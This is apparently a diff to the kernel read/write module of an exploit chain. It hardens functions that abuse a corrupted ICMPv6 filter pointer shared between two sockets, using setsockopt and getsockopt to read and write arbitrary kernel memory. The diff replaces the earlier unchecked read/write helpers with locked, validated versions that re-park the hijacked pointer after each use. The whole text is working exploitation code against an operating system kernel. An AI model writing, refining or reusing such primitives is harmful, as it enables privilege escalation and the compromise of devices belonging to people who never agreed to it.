@@ -3,141 +3,112 @@
 #include <errno.h>
 #include <netinet/icmp6.h>
 #include <netinet/in.h>
+#include <pthread.h>
 #include <string.h>
 #include <sys/socket.h>
 
-static void set_target_kaddr(uint64_t where) {
-    memset(g_ctx.control_data, 0, sizeof(g_ctx.control_data));
-    // set the address we want to read from
-    memcpy(g_ctx.control_data, &where, sizeof(where));
+static pthread_mutex_t krw_lock = PTHREAD_MUTEX_INITIALIZER;
 
-    // socket_t sock, int level, int optname, const void *optval, int optlen
-    // we're writting rw_sockets icmp6filt ptr
-    int res = setsockopt(g_ctx.control_socket, IPPROTO_ICMPV6, ICMP6_FILTER, g_ctx.control_data, sizeof(g_ctx.control_data));
-    if (res != 0) {
-        LOG_ERR("set_target_kaddr: setsockopt: %s (%d)", strerror(errno), errno);
-        while (1);
-    }
+bool krw_is_kernel_address(uint64_t address) {
+    return address != 0 && (address & 0xfffff00000000000ULL) == 0xfffff00000000000ULL;
 }
 
-static void early_kread(uint64_t where, void* read_buf, uint64_t size) {
-    // early krw is max 32 bytes
-    if (size > EARLY_KRW_LENGTH) {
-        LOG_ERR("early_kread size > EARLY_KRW_LENGTH");
-        while (1);
-    }
-
-    // we're writting rw_sockets icmp6filt ptr
-    set_target_kaddr(where);
-    // read target ptr
-    int res = getsockopt(g_ctx.rw_socket, IPPROTO_ICMPV6, ICMP6_FILTER, read_buf, (socklen_t*)&size);
-    if (res != 0) {
-        LOG_ERR("early_kread: getsockopt: %s (%d)", strerror(errno), errno);
-        while (1);
-    }
+static bool krw_range_valid(uint64_t address, size_t size) {
+    return size > 0 && address + size - 1 >= address && krw_is_kernel_address(address) && krw_is_kernel_address(address + size - 1);
 }
 
-uint64_t early_kread64(uint64_t where) {
-    uint64_t value = 0;
-    early_kread(where, &value, sizeof(value));
-    return value;
-}
-
-static void early_kwrite32bytes(uint64_t where, void* write_buf) {
-    // we're writting rw_sockets icmp6filt ptr
-    set_target_kaddr(where);
-
-    // setsockopt instead of getsockopt...
-    int res = setsockopt(g_ctx.rw_socket, IPPROTO_ICMPV6, ICMP6_FILTER, write_buf, EARLY_KRW_LENGTH);
-    if (res != 0) {
-        LOG_ERR("early_kwrite32bytes: setsockopt: %s (%d)", strerror(errno), errno);
-        while (1);
-    }
-}
-
-void early_kwrite64(uint64_t where, uint64_t what) {
-    // we read 32 bytes at where
-    early_kread(where, g_ctx.early_kwrite64_write_buf, EARLY_KRW_LENGTH);
-    // we write the value we want to write
-    memcpy(g_ctx.early_kwrite64_write_buf, &what, sizeof(what));
-    // we write 32 bytes at where
-    early_kwrite32bytes(where, g_ctx.early_kwrite64_write_buf);
-}
-
-// seems unused in this part of pe at least
-void kread_length(uint64_t address, void* buffer, uint64_t size) {
-    uint64_t remaining = size;
-    uint64_t read_offset = 0;
-
-    // read in 32 byte chunks
-    while (remaining != 0) {
-        uint64_t read_size = 0;
-        if (remaining >= EARLY_KRW_LENGTH) {
-            read_size = EARLY_KRW_LENGTH;
-        } else {
-            read_size = remaining % EARLY_KRW_LENGTH;
+static bool repark_locked(void) {
+    if (!g_ctx.filter_snapshots_valid || g_ctx.control_socket < 0) return false;
+    for (unsigned attempt = 0; attempt < 3; attempt++) {
+        if (setsockopt(g_ctx.control_socket, IPPROTO_ICMPV6, ICMP6_FILTER, g_ctx.rw_filter_snapshot, EARLY_KRW_LENGTH) != 0) {
+            continue;
         }
-
-        early_kread(address + read_offset, (uint8_t*)buffer + read_offset, read_size);
-        remaining -= read_size;
-        read_offset += read_size;
+        uint8_t readback[EARLY_KRW_LENGTH] = {};
+        socklen_t length = sizeof(readback);
+        if (getsockopt(g_ctx.control_socket, IPPROTO_ICMPV6, ICMP6_FILTER, readback, &length) == 0 && length >= EARLY_KRW_LENGTH && memcmp(readback, g_ctx.rw_filter_snapshot, EARLY_KRW_LENGTH) == 0) {
+            return true;
+        }
     }
+    LOG_ERR("KRW repark could not be verified");
+    g_ctx.transport_unsafe = true;
+    return false;
 }
 
-// seems unused in this part of pe at least
-void kwrite_length(uint64_t dst, void* src, uint64_t size) {
-    uint64_t remaining = size;
-    uint64_t write_offset = 0;
-
-    // write in 32 byte chunks
-    while (remaining != 0) {
-        uint64_t write_size = 0;
-        if (remaining >= EARLY_KRW_LENGTH) {
-            write_size = EARLY_KRW_LENGTH;
-        } else {
-            write_size = remaining % EARLY_KRW_LENGTH;
-        }
-
-        uint64_t kwrite_dst_addr = dst + write_offset;
-        uint8_t* kwrite_src_addr = (uint8_t*)src + write_offset;
-
-        if (write_size != EARLY_KRW_LENGTH) {
-            kread_length(kwrite_dst_addr, g_ctx.kwrite_length_buffer, EARLY_KRW_LENGTH);
-        }
-
-        memcpy(g_ctx.kwrite_length_buffer, kwrite_src_addr, write_size);
-        early_kwrite32bytes(kwrite_dst_addr, g_ctx.kwrite_length_buffer);
-
-        remaining -= write_size;
-        write_offset += write_size;
+static bool set_target_locked(uint64_t where) {
+    uint8_t target[EARLY_KRW_LENGTH];
+    memcpy(target, g_ctx.rw_filter_snapshot, sizeof(target));
+    memcpy(target, &where, sizeof(where));
+    if (setsockopt(g_ctx.control_socket, IPPROTO_ICMPV6, ICMP6_FILTER, target, sizeof(target)) == 0) {
+        return true;
     }
+    LOG_ERR("KRW set target failed at %#llx: %s (%d)", where, strerror(errno), errno);
+    return false;
 }
 
-// seems unused in this part of pe at least
-bool kwrite_zone_element(uint64_t dst, void* src, uint64_t len) {
-    if (len < CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE) {
-        LOG_ERR("kwrite_zone_element supports only size >= 0x20");
+bool early_kread_checked(uint64_t where, void* read_buf, size_t size) {
+    if (read_buf == NULL || size > EARLY_KRW_LENGTH || !krw_range_valid(where, size) || !g_ctx.filter_snapshots_valid || g_ctx.control_socket < 0 || g_ctx.rw_socket < 0) {
+        if (read_buf != NULL && size > 0) memset(read_buf, 0, size);
+        LOG_ERR("kread rejected at %#llx", where);
         return false;
     }
 
-    uint64_t remaining = len;
-    uint64_t write_offset = 0;
+    pthread_mutex_lock(&krw_lock);
+    bool targeted = set_target_locked(where);
+    socklen_t length = (socklen_t)size;
+    int result = targeted ? getsockopt(g_ctx.rw_socket, IPPROTO_ICMPV6, ICMP6_FILTER, read_buf, &length) : -1;
+    int saved_errno = errno;
+    bool parked = repark_locked();
+    pthread_mutex_unlock(&krw_lock);
 
-    while (remaining != 0) {
-        uint64_t write_size = remaining >= CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE ? CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE : (remaining % CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE);
-        uint64_t kwrite_dst_addr = dst + write_offset;
-        uint8_t* kwrite_src_addr = (uint8_t*)src + write_offset;
-
-        if (write_size != CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE) {
-            uint64_t adjust = CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE - write_size;
-            kwrite_dst_addr -= adjust;
-            kwrite_src_addr -= adjust;
+    if (!targeted || result != 0 || length < size || !parked) {
+        memset(read_buf, 0, size);
+        if (targeted && result != 0) {
+            LOG_ERR("kread failed at %#llx: %s (%d)", where, strerror(saved_errno), saved_errno);
         }
+        return false;
+    }
+    return true;
+}
 
-        kwrite_length(kwrite_dst_addr, kwrite_src_addr, CHAIN_WRITE_ZONE_ELEMENT_MIN_SIZE);
-        remaining -= write_size;
-        write_offset += write_size;
+bool early_kread64_checked(uint64_t where, uint64_t* value) {
+    if (value == NULL) return false;
+    *value = 0;
+    return early_kread_checked(where, value, sizeof(*value));
+}
+
+static bool early_kwrite32bytes_checked(uint64_t where, const void* write_buf) {
+    if (write_buf == NULL || !krw_range_valid(where, EARLY_KRW_LENGTH) || !g_ctx.filter_snapshots_valid || g_ctx.control_socket < 0 || g_ctx.rw_socket < 0) {
+        LOG_ERR("kwrite rejected at %#llx", where);
+        return false;
     }
 
+    pthread_mutex_lock(&krw_lock);
+    bool targeted = set_target_locked(where);
+    int result = targeted ? setsockopt(g_ctx.rw_socket, IPPROTO_ICMPV6, ICMP6_FILTER, write_buf, EARLY_KRW_LENGTH) : -1;
+    int saved_errno = errno;
+    bool parked = repark_locked();
+    pthread_mutex_unlock(&krw_lock);
+
+    if (!targeted || result != 0 || !parked) {
+        if (targeted && result != 0) {
+            LOG_ERR("kwrite failed at %#llx: %s (%d)", where, strerror(saved_errno), saved_errno);
+        }
+        return false;
+    }
     return true;
+}
+
+bool early_kwrite64_checked(uint64_t where, uint64_t what) {
+    uint8_t write_buf[EARLY_KRW_LENGTH];
+    if (!early_kread_checked(where, write_buf, sizeof(write_buf))) return false;
+    memcpy(write_buf, &what, sizeof(what));
+    return early_kwrite32bytes_checked(where, write_buf);
+}
+
+bool krw_park_transport(void) {
+    if (!g_ctx.filter_snapshots_valid || g_ctx.control_socket < 0) return false;
+    pthread_mutex_lock(&krw_lock);
+    bool parked = repark_locked();
+    pthread_mutex_unlock(&krw_lock);
+    return parked;
 }
